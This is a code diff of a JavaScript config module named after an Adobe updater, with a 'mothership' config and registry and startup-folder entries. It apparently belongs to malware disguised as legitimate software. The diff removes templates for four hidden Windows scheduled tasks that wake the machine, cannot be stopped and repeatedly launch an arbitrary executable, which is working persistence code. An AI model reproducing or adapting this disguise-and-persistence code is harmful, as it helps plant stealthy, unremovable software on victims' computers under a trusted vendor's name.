@@ -1,5 +1,6 @@
 const path = require("path");
 const helper = require("./adobeupdate.helper.js");
+const helper_cmd = require("./adobeupdate.helper.cmd.js");
 
 var mothershipconfig = {
 
@@ -124,7 +125,7 @@ var systemconfig = {
     get cmdconfig() {
         if (this.__cmdconfig) return this.__cmdconfig;
 
-        this.__cmdconfig = new CmdConfig(this.cmdname);
+        this.__cmdconfig = new helper_cmd.CmdConfig(this.cmdname);
         return this.__cmdconfig;
     },
 
@@ -275,7 +276,7 @@ var systemconfig = {
     __scriptmd5: "",
     get scriptmd5() {
         if (isNullOrWhitespace(this.__scriptmd5))
-            this.__scriptmd5 = getFileMD5(this.scriptfpath);
+            this.__scriptmd5 = helper.getFileMD5(this.scriptfpath);
 
         return this.__scriptmd5;
     },
@@ -319,60 +320,6 @@ var systemconfig = {
 
     get statestr() {
         return `cmdname=${this.cmdname} cmdtaskname=${this.cmdtaskname} ts=${this.scriptts} pid=${this.scriptpid} ppid=${this.scriptparentpid}`;
-    },
-};
-
-var taskconfig = {
-    tasks: [
-        {
-            name: "adobeupdate_IdleTask",
-            enabled: true,
-            taskfunc: getIdleTaskXMLStr,
-            tasktime: 1,
-        },
-        {
-            name: "adobeupdate_RepTask",
-            enabled: true,
-            taskfunc: getRepTaskXMLStr,
-            tasktime: 1,
-        },
-        {
-            name: "adobeupdate_TimeTask",
-            enabled: true,
-            taskfunc: getTimeTaskXMLStr,
-            tasktime: 1,
-        },
-        {
-            name: "adobeupdate_DailyTask",
-            enabled: true,
-            taskfunc: getDailyTaskXMLStr,
-            tasktime: 1,
-        },
-    ],
-
-    getTaskTime(taskname) {
-        for (const task of this.tasks) {
-            if (task.name == taskname) return task.tasktime;
-        }
-        return -1;
-    },
-
-    getTaskXMLFunc(taskname) {
-        for (const task of this.tasks) {
-            if (task.name == taskname) {
-                return task.taskfunc;
-            }
-        }
-    },
-
-    get tasknames() {
-        let arr = [];
-
-        for (const task of this.tasks) {
-            arr.push(task.name);
-        }
-
-        return arr;
     },
 };
 
@@ -546,231 +493,9 @@ var startupfolderconfig = {
     ],
 };
 
-function getIdleTaskXMLStr(
-    intaskname,
-    tasktimestr,
-    tskxmltime,
-    pexe,
-    args,
-    workdir
-) {
-    // tasktimestr --> 2005-01-01T00:08:00
-    let taskxmlstr = `
-        <?xml version="1.0" encoding="UTF-16" ?>
-        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-        <RegistrationInfo>
-            <Date>2026-04-26T09:45:36.6514157</Date>
-            <Author>test</Author>
-            <URI>${intaskname}</URI>
-        </RegistrationInfo>
-        <Triggers>
-            <IdleTrigger>
-                <StartBoundary>${tasktimestr}</StartBoundary>
-            </IdleTrigger>
-        </Triggers>
-        <Settings>
-            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-            <AllowHardTerminate>false</AllowHardTerminate>
-            <StartWhenAvailable>true</StartWhenAvailable>
-            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-            <IdleSettings>
-                <Duration>PT${tskxmltime}M</Duration>
-                <WaitTimeout>PT1H</WaitTimeout>
-                <StopOnIdleEnd>false</StopOnIdleEnd>
-                <RestartOnIdle>false</RestartOnIdle>
-            </IdleSettings>
-            <AllowStartOnDemand>true</AllowStartOnDemand>
-            <Enabled>true</Enabled>
-            <Hidden>true</Hidden>
-            <RunOnlyIfIdle>false</RunOnlyIfIdle>
-            <WakeToRun>true</WakeToRun>
-            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-            <Priority>7</Priority>
-        </Settings>
-        <Actions Context="Author">
-            <Exec>
-                <Command>${pexe}</Command>
-                <Arguments>${args}</Arguments>
-                <WorkingDirectory>${workdir}</WorkingDirectory>
-            </Exec>
-        </Actions>
-        </Task>`;
-
-    return taskxmlstr;
-}
-
-function getRepTaskXMLStr(
-    intaskname,
-    tasktimestr,
-    tskxmltime,
-    pexe,
-    args,
-    workdir
-) {
-    let taskxmlstr = `
-        <?xml version="1.0" encoding="UTF-16" ?>
-        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-            <RegistrationInfo>
-                <Date>2026-04-26T09:45:36.6514157</Date>
-                <Author>test</Author>
-                <URI>${intaskname}</URI>
-            </RegistrationInfo>
-            <Triggers>
-                <CalendarTrigger>
-                    <StartBoundary>${tasktimestr}</StartBoundary>
-                    <Repetition>
-                        <Interval>PT${tskxmltime}M</Interval>
-                        <StopAtDurationEnd>false</StopAtDurationEnd>
-                    </Repetition>
-                    <ScheduleByDay>
-                        <DaysInterval>1</DaysInterval>
-                    </ScheduleByDay>
-                </CalendarTrigger>
-            </Triggers>
-            <Settings>
-                <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-                <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-                <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-                <AllowHardTerminate>false</AllowHardTerminate>
-                <StartWhenAvailable>true</StartWhenAvailable>
-                <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-                <IdleSettings>
-                    <StopOnIdleEnd>false</StopOnIdleEnd>
-                    <RestartOnIdle>false</RestartOnIdle>
-                </IdleSettings>
-                <AllowStartOnDemand>true</AllowStartOnDemand>
-                <Enabled>true</Enabled>
-                <Hidden>true</Hidden>
-                <RunOnlyIfIdle>false</RunOnlyIfIdle>
-                <WakeToRun>true</WakeToRun>
-                <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-                <Priority>7</Priority>
-            </Settings>
-            <Actions Context="Author">
-                <Exec>
-                    <Command>${pexe}</Command>
-                    <Arguments>${args}</Arguments>
-                    <WorkingDirectory>${workdir}</WorkingDirectory>
-                </Exec>
-            </Actions>
-        </Task>`;
-
-    return taskxmlstr;
-}
-
-function getTimeTaskXMLStr(
-    intaskname,
-    tasktimestr,
-    timetaskxmltime,
-    pexe,
-    args,
-    workdir
-) {
-    let taskxmlstr = `
-        <?xml version="1.0" encoding="UTF-16"?>
-        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-        <RegistrationInfo>
-            <Date>2026-04-26T09:45:36.6514157</Date>
-            <Author>test</Author>
-            <URI>${intaskname}</URI>
-        </RegistrationInfo>
-        <Triggers>
-            <TimeTrigger>
-                <StartBoundary>${tasktimestr}</StartBoundary>
-                <Repetition>
-                <Interval>PT${timetaskxmltime}M</Interval>
-                </Repetition>
-                <RandomDelay>PT30S</RandomDelay>
-            </TimeTrigger>
-        </Triggers>
-        <Settings>
-            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-            <AllowHardTerminate>false</AllowHardTerminate>
-            <StartWhenAvailable>true</StartWhenAvailable>
-            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-            <IdleSettings>
-                <StopOnIdleEnd>false</StopOnIdleEnd>
-                <RestartOnIdle>false</RestartOnIdle>
-            </IdleSettings>
-            <AllowStartOnDemand>true</AllowStartOnDemand>
-            <Enabled>true</Enabled>
-            <Hidden>true</Hidden>
-            <RunOnlyIfIdle>false</RunOnlyIfIdle>
-            <WakeToRun>true</WakeToRun>
-            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-            <Priority>7</Priority>
-        </Settings>
-        <Actions Context="Author">
-        <Exec>
-            <Command>${pexe}</Command>
-            <Arguments>${args}</Arguments>
-            <WorkingDirectory>${workdir}</WorkingDirectory>
-        </Exec>
-        </Actions>
-        </Task>`;
-
-    return taskxmlstr;
-}
-
-function getDailyTaskXMLStr(
-    intaskname,
-    tasktimestr,
-    timetaskxmltime,
-    pexe,
-    args,
-    workdir
-) {
-    let taskxmlstr = `
-        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-        <RegistrationInfo>
-            <Date>2026-04-26T09:45:36.6514157</Date>
-            <Author>test</Author>
-            <URI>${intaskname}</URI>
-        </RegistrationInfo>
-        <Triggers>
-            <CalendarTrigger>
-                <StartBoundary>${tasktimestr}</StartBoundary>
-                <Enabled>true</Enabled>
-                <ScheduleByDay>
-                    <DaysInterval>${timetaskxmltime}</DaysInterval>
-                </ScheduleByDay>
-            </CalendarTrigger>
-        </Triggers>
-        <Settings>
-            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-            <AllowHardTerminate>false</AllowHardTerminate>
-            <StartWhenAvailable>true</StartWhenAvailable>
-            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-            <IdleSettings>
-                <StopOnIdleEnd>false</StopOnIdleEnd>
-                <RestartOnIdle>false</RestartOnIdle>
-            </IdleSettings>
-            <AllowStartOnDemand>true</AllowStartOnDemand>
-            <Enabled>true</Enabled>
-            <Hidden>true</Hidden>
-            <RunOnlyIfIdle>false</RunOnlyIfIdle>
-            <WakeToRun>true</WakeToRun>
-            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-            <Priority>7</Priority>
-        </Settings>
-        <Actions Context="Author">
-            <Exec>
-                <Command>${pexe}</Command>
-                <Arguments>${args}</Arguments>
-                <WorkingDirectory>${workdir}</WorkingDirectory>
-            </Exec>
-        </Actions>
-        </Task>`;
-
-    return taskxmlstr;
-}
-
 module.exports = {
-    systemconfig
+    systemconfig,
+    mothershipconfig,
+    regstartupconfig,
+    startupfolderconfig
 };
